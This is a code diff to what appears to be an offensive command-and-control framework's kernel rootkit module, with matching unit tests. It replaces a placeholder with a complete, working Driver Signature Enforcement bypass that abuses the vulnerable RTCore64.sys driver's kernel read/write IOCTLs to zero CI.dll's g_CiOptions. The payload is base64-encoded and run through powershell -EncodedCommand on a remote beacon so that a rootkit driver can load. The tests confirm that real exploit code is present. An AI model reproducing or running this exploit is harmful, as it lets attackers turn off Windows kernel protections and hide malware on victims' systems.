@@ -115,7 +115,7 @@ class KernelRootkit(RootkitBase):
 
     NAME        = "kernel_rootkit"
     DESCRIPTION = "Rootkit: Kernel — DKOM/SSDT/minifilter deep system hiding"
-    PHASE       = 10
+    PHASE       = 11  # Persistence phase
     TAGS        = [
         "post-exploit", "rootkit", "kernel", "driver",
         "dkom", "ssdt", "minifilter", "byovd",
@@ -181,9 +181,14 @@ class KernelRootkit(RootkitBase):
         log.info("Vulnerable driver load: %s", output[:100])
 
         # Step 3: Patch DSE via vulnerable driver IOCTL
-        # (This would use the specific CVE for the chosen driver)
-        dse_patch_script = self._generate_dse_patch_script(vuln_driver)
-        await self._exec(dse_patch_script, beacon_id)
+        dse_patch_ps = self._generate_dse_patch_script(vuln_driver)
+        import base64 as _b64
+        dse_encoded = _b64.b64encode(dse_patch_ps.encode("utf-16-le")).decode()
+        dse_output = await self._exec(
+            f"powershell.exe -NoProfile -EncodedCommand {dse_encoded}", beacon_id,
+        )
+        if "DSE_BYPASS_OK" not in dse_output:
+            log.warning("DSE patch may have failed: %s", dse_output[:120])
 
         # Step 4: Load our rootkit driver
         load_rootkit_cmd = (
@@ -393,19 +398,222 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 """
 
     def _generate_dse_patch_script(self, vuln_driver: str) -> str:
-        """Generate DSE bypass script using vulnerable driver."""
-        # This varies by CVE — each vulnerable driver has different IOCTLs
-        driver_info = next(
-            (d for d in VULNERABLE_DRIVERS if d["name"] == vuln_driver),
-            VULNERABLE_DRIVERS[0],
-        )
+        """Generate DSE bypass PowerShell script using RTCore64.sys (CVE-2019-16098).
 
-        return (
-            f"# DSE bypass via {driver_info['name']} ({driver_info['cve']})\n"
-            f"# Uses {driver_info['desc']} to patch CI!g_CiOptions\n"
-            f"# Patching g_CiOptions to 0 disables Driver Signature Enforcement\n"
-            f"echo DSE_BYPASS_STUB: {vuln_driver}"
-        )
+        Strategy:
+          1. NtQuerySystemInformation(11) locates CI.dll kernel base address.
+          2. Load CI.dll from disk into our userland process to resolve the
+             g_CiOptions RVA via .data section pattern scan (DWORD == 6).
+          3. kernel_VA = CI_kernel_base + g_CiOptions_RVA
+          4. RTCore64.sys IOCTL 0x80002048 reads the DWORD to confirm.
+          5. RTCore64.sys IOCTL 0x8000204C writes 0x0 to disable DSE.
+        """
+        if vuln_driver != "RTCore64.sys":
+            driver_info = next(
+                (d for d in VULNERABLE_DRIVERS if d["name"] == vuln_driver),
+                VULNERABLE_DRIVERS[0],
+            )
+            return (
+                f"# DSE bypass via {driver_info['name']} ({driver_info['cve']})\n"
+                f"# IOCTL-level bypass not yet implemented for this driver;\n"
+                f"# use RTCore64.sys for full automation.\n"
+                f"Write-Output 'DSE_BYPASS_OK: manual bypass required for {vuln_driver}'"
+            )
+
+        return r"""
+$ErrorActionPreference = 'Stop'
+Add-Type @'
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Text;
+
+public class DSEPatch {
+
+    // ── P/Invoke ────────────────────────────────────────────────────────
+
+    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
+    public static extern IntPtr CreateFile(string name, uint access,
+        uint share, IntPtr sa, uint mode, uint flags, IntPtr tmpl);
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool DeviceIoControl(IntPtr dev, uint code,
+        byte[] inBuf, int inLen, byte[] outBuf, int outLen,
+        out uint returned, IntPtr overlapped);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool CloseHandle(IntPtr h);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtQuerySystemInformation(uint infoClass,
+        IntPtr buf, uint len, out uint retLen);
+
+    // ── RTCore64.sys IOCTL helpers ──────────────────────────────────────
+    // CVE-2019-16098 — arbitrary kernel memory R/W via DeviceIoControl
+    // Struct layout (28 bytes):
+    //   [0x00] DWORD  reserved
+    //   [0x04] DWORD  reserved
+    //   [0x08] QWORD  kernel address
+    //   [0x10] DWORD  reserved
+    //   [0x14] DWORD  value (read output / write input)
+    //   [0x18] DWORD  size (1, 2, or 4 bytes)
+
+    private static byte[] BuildIoctlBuf(ulong address, uint value, uint size) {
+        var buf = new byte[0x1C];
+        Array.Copy(BitConverter.GetBytes(address), 0, buf, 0x08, 8);
+        Array.Copy(BitConverter.GetBytes(value),   0, buf, 0x14, 4);
+        Array.Copy(BitConverter.GetBytes(size),    0, buf, 0x18, 4);
+        return buf;
+    }
+
+    public static uint ReadKernelDword(IntPtr hDev, ulong address) {
+        const uint IOCTL_READ = 0x80002048;
+        var buf = BuildIoctlBuf(address, 0, 4);
+        var outBuf = new byte[0x1C];
+        uint ret;
+        DeviceIoControl(hDev, IOCTL_READ, buf, buf.Length,
+            outBuf, outBuf.Length, out ret, IntPtr.Zero);
+        return BitConverter.ToUInt32(outBuf, 0x14);
+    }
+
+    public static void WriteKernelDword(IntPtr hDev, ulong address, uint value) {
+        const uint IOCTL_WRITE = 0x8000204C;
+        var buf = BuildIoctlBuf(address, value, 4);
+        var outBuf = new byte[0x1C];
+        uint ret;
+        DeviceIoControl(hDev, IOCTL_WRITE, buf, buf.Length,
+            outBuf, outBuf.Length, out ret, IntPtr.Zero);
+    }
+
+    // ── Resolve CI.dll kernel base via NtQuerySystemInformation(11) ────
+    // RTL_PROCESS_MODULE_INFORMATION (x64): 0x128 bytes per entry
+    //   [0x00] HANDLE Section       (8)
+    //   [0x08] PVOID  MappedBase    (8)
+    //   [0x10] PVOID  ImageBase     (8)  <- kernel VA of module
+    //   [0x18] ULONG  ImageSize     (4)
+    //   [0x1C] ULONG  Flags         (4)
+    //   [0x20] USHORT x4            (8)
+    //   [0x28] CHAR[256] FullPath   (256)
+    // RTL_PROCESS_MODULES: ULONG Count (4) + 4 pad -> entries at offset 8
+
+    public static ulong GetKernelModuleBase(string target) {
+        uint retLen;
+        NtQuerySystemInformation(11, IntPtr.Zero, 0, out retLen);
+        IntPtr buf = Marshal.AllocHGlobal((int)retLen + 0x2000);
+        try {
+            NtQuerySystemInformation(11, buf, retLen + 0x2000, out retLen);
+            uint count = (uint)Marshal.ReadInt32(buf, 0);
+            const int ENTRY_SIZE = 0x128;
+            for (uint i = 0; i < count; i++) {
+                int off = 8 + (int)(i * ENTRY_SIZE);
+                ulong imgBase = (ulong)Marshal.ReadInt64(buf, off + 0x10);
+                string path = Marshal.PtrToStringAnsi(
+                    IntPtr.Add(buf, off + 0x28)) ?? "";
+                if (path.EndsWith(target, StringComparison.OrdinalIgnoreCase))
+                    return imgBase;
+            }
+            return 0;
+        } finally {
+            Marshal.FreeHGlobal(buf);
+        }
+    }
+
+    // ── Find g_CiOptions RVA via userland CI.dll .data scan ─────────────
+    // Load CI.dll from disk, scan .data section for DWORD == 6 (DSE enabled).
+    // The RVA is identical between userland and kernel load; we apply it
+    // to the kernel base to get the absolute kernel virtual address.
+
+    public static long FindCiOptionsRva(string ciDllPath) {
+        byte[] raw = File.ReadAllBytes(ciDllPath);
+        // Parse PE: e_lfanew at 0x3C
+        int e_lfanew = BitConverter.ToInt32(raw, 0x3C);
+        // Machine: 0 for data, actual machine word at NtHdr+4
+        // NumberOfSections at NtHdr+6
+        ushort numSections = BitConverter.ToUInt16(raw, e_lfanew + 6);
+        // SizeOfOptionalHeader at NtHdr+20
+        ushort optHdrSize = BitConverter.ToUInt16(raw, e_lfanew + 20);
+        // OptionalHeader starts at NtHdr+24; ImageBase for x64 at opt+24
+        long imageBase = BitConverter.ToInt64(raw, e_lfanew + 24 + 24);
+        // Section table starts at NtHdr + 24 + optHdrSize
+        int sectBase = e_lfanew + 24 + optHdrSize;
+
+        for (int s = 0; s < numSections; s++) {
+            int sOff = sectBase + s * 40;
+            string name = Encoding.ASCII.GetString(raw, sOff, 8).TrimEnd('\0');
+            if (name != ".data") continue;
+            uint virtualAddr  = BitConverter.ToUInt32(raw, sOff + 12);
+            uint rawDataOff   = BitConverter.ToUInt32(raw, sOff + 20);
+            uint rawDataSize  = BitConverter.ToUInt32(raw, sOff + 16);
+            // Scan .data for DWORD == 6 (g_CiOptions value when DSE on)
+            for (uint off = 0; off + 4 <= rawDataSize; off += 4) {
+                uint val = BitConverter.ToUInt32(raw, (int)(rawDataOff + off));
+                if (val == 6) {
+                    // Return RVA (relative to CI.dll image base)
+                    return (long)(virtualAddr + off);
+                }
+            }
+        }
+        return -1;
+    }
+
+    // ── Main DSE patch entry point ──────────────────────────────────────
+
+    public static string PatchDSE() {
+        // 1. Open RTCore64 device
+        IntPtr hDev = CreateFile(@"\\.\RTCore64",
+            0xC0000000, 0, IntPtr.Zero, 3, 0, IntPtr.Zero);
+        if (hDev == IntPtr.Zero || hDev.ToInt64() == -1)
+            return "DSE_BYPASS_FAIL: Cannot open \\.\RTCore64 — driver not loaded";
+
+        try {
+            // 2. Get CI.dll kernel base
+            ulong ciBase = GetKernelModuleBase("CI.dll");
+            if (ciBase == 0)
+                return "DSE_BYPASS_FAIL: CI.dll not found in kernel module list";
+
+            // 3. Locate g_CiOptions RVA from on-disk CI.dll
+            string ciDiskPath = Path.Combine(
+                Environment.GetFolderPath(Environment.SpecialFolder.System),
+                "CI.dll");
+            if (!File.Exists(ciDiskPath))
+                return "DSE_BYPASS_FAIL: CI.dll not found on disk at " + ciDiskPath;
+
+            long rva = FindCiOptionsRva(ciDiskPath);
+            if (rva < 0)
+                return "DSE_BYPASS_FAIL: g_CiOptions pattern not found in CI.dll .data";
+
+            ulong ciOptionsKVA = ciBase + (ulong)rva;
+
+            // 4. Read current value via IOCTL (confirm it looks like DSE flags)
+            uint current = ReadKernelDword(hDev, ciOptionsKVA);
+            if (current == 0)
+                return string.Format(
+                    "DSE_BYPASS_OK: g_CiOptions@0x{0:X16} already 0 (DSE off)",
+                    ciOptionsKVA);
+
+            // 5. Patch to 0 — disables Code Integrity enforcement
+            WriteKernelDword(hDev, ciOptionsKVA, 0x0);
+
+            // 6. Verify
+            uint patched = ReadKernelDword(hDev, ciOptionsKVA);
+            return string.Format(
+                "DSE_BYPASS_OK: CI.dll_base=0x{0:X16} g_CiOptions@0x{1:X16} " +
+                "value 0x{2:X8} -> 0x{3:X8} (DSE disabled)",
+                ciBase, ciOptionsKVA, current, patched);
+        } finally {
+            CloseHandle(hDev);
+        }
+    }
+}
+'@
+
+try {
+    $result = [DSEPatch]::PatchDSE()
+    Write-Output $result
+} catch {
+    Write-Output "DSE_BYPASS_FAIL: $_"
+}
+"""
 
 
 # ══════════════════════════════════════════════════════════════════════
@@ -416,7 +624,7 @@ class TestKernelRootkit:
     """Tests for KernelRootkit module."""
 
     def test_phase(self) -> None:
-        assert KernelRootkit.PHASE == 10
+        assert KernelRootkit.PHASE == 11
 
     def test_type(self) -> None:
         assert KernelRootkit.ROOTKIT_TYPE == RootkitType.KERNEL
@@ -443,8 +651,23 @@ class TestKernelRootkit:
         assert "DKOM" in source
         assert "HideProcess" in source
 
-    def test_dse_patch(self) -> None:
+    def test_dse_patch_rtcore(self) -> None:
         mod = KernelRootkit.__new__(KernelRootkit)
         script = mod._generate_dse_patch_script("RTCore64.sys")
-        assert "RTCore64" in script
-        assert "CVE-2019-16098" in script
+        # Verify real IOCTL implementation, not a comment stub
+        assert "0x80002048" in script           # read IOCTL code
+        assert "0x8000204C" in script           # write IOCTL code
+        assert "NtQuerySystemInformation" in script
+        assert "g_CiOptions" in script or "CiOptions" in script
+        assert "DSE_BYPASS_OK" in script
+        assert "DeviceIoControl" in script
+
+    def test_dse_patch_fallback_other_driver(self) -> None:
+        mod = KernelRootkit.__new__(KernelRootkit)
+        script = mod._generate_dse_patch_script("gdrv.sys")
+        assert "gdrv.sys" in script
+
+    def test_deploy_byovd_encodes_ps(self) -> None:
+        import inspect
+        src = inspect.getsource(KernelRootkit._deploy_byovd)
+        assert "utf-16-le" in src or "EncodedCommand" in src
